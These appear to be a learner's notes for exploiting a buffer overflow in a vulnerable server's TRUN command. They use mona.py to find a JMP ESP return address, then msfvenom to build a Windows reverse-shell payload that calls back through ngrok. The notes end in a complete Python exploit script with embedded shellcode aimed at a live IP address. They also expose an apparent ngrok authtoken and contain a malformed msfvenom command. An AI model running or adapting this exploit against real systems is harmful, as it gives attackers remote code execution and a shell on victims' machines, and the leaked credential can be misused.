

bad chars
ESP follow in dump 
look for bad chars
mona.py
https://raw.githubusercontent.com/corelan/mona/master/mona.py

add to `C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands`

`!monda modules`

`/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`

```
nasm > JMP ESP
00000000  FFE4              jmp esp
nasm > 
```

`!mona find -s "\xff\xe4" -m essfunc.dll`

we have address, return address 
using `625011AF`

in debugger search for the expression: 625011af

set breakpoint at the address; 

and running we will hit the break point

`msfvenom -p windows/shell_reverse_tcp LHOST=http://93e4ea76d18d.ngrok.io LPORT=4444 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00"`


```ngrok authtoken 1rlVs7RGQ2BLrI2v6RPBeLumzi3_7RE7DUu2F25Z3sRCFQ4cV

msfvenom -p windows/shell_reverse_tcp LHOST=0.tcp.ngrok.io LHOST=11929 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00"


#!/bin/python2

import socket
import sys
#625011AF

exploit=(
"\xbe\xec\x6f\xaf\x36\xdb\xcd\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
"\x52\x83\xed\xfc\x31\x75\x0e\x03\x99\x61\x4d\xc3\x9d\x96\x13"
"\x2c\x5d\x67\x74\xa4\xb8\x56\xb4\xd2\xc9\xc9\x04\x90\x9f\xe5"
"\xef\xf4\x0b\x7d\x9d\xd0\x3c\x36\x28\x07\x73\xc7\x01\x7b\x12"
"\x4b\x58\xa8\xf4\x72\x93\xbd\xf5\xb3\xce\x4c\xa7\x6c\x84\xe3"
"\x57\x18\xd0\x3f\xdc\x52\xf4\x47\x01\x22\xf7\x66\x94\x38\xae"
"\xa8\x17\xec\xda\xe0\x0f\xf1\xe7\xbb\xa4\xc1\x9c\x3d\x6c\x18"
"\x5c\x91\x51\x94\xaf\xeb\x96\x13\x50\x9e\xee\x67\xed\x99\x35"
"\x15\x29\x2f\xad\xbd\xba\x97\x09\x3f\x6e\x41\xda\x33\xdb\x05"
"\x84\x57\xda\xca\xbf\x6c\x57\xed\x6f\xe5\x23\xca\xab\xad\xf0"
"\x73\xea\x0b\x56\x8b\xec\xf3\x07\x29\x67\x19\x53\x40\x2a\x76"
"\x90\x69\xd4\x86\xbe\xfa\xa7\xb4\x61\x51\x2f\xf5\xea\x7f\xa8"
"\xfa\xc0\x38\x26\x05\xeb\x38\x6f\xc2\xbf\x68\x07\xe3\xbf\xe2"
"\xd7\x0c\x6a\xa4\x87\xa2\xc5\x05\x77\x03\xb6\xed\x9d\x8c\xe9"
"\x0e\x9e\x46\x82\xa5\x65\x01\xad\x39\x4b\x48\xc5\x3b\x93\x7b"
"\x4a\xb5\x75\x11\x62\x93\x2e\x8e\x1b\xbe\xa4\x2f\xe3\x14\xc1"
"\x70\x6f\x9b\x36\x3e\x98\xd6\x24\xd7\x68\xad\x16\x7e\x76\x1b"
"\x3e\x1c\xe5\xc0\xbe\x6b\x16\x5f\xe9\x3c\xe8\x96\x7f\xd1\x53"
"\x01\x9d\x28\x05\x6a\x25\xf7\xf6\x75\xa4\x7a\x42\x52\xb6\x42"
"\x4b\xde\xe2\x1a\x1a\x88\x5c\xdd\xf4\x7a\x36\xb7\xab\xd4\xde"
"\x4e\x80\xe6\x98\x4e\xcd\x90\x44\xfe\xb8\xe4\x7b\xcf\x2c\xe1"
"\x04\x2d\xcd\x0e\xdf\xf5\xed\xec\xf5\x03\x86\xa8\x9c\xa9\xcb"
"\x4a\x4b\xed\xf5\xc8\x79\x8e\x01\xd0\x08\x8b\x4e\x56\xe1\xe1"
"\xdf\x33\x05\x55\xdf\x11"
)


shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + exploit

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	connect = s.connect(('65.2.144.108', 9999))
	s.send(('TRUN /.:/' + shellcode))
except:
	print "no connection"

s.close()
```



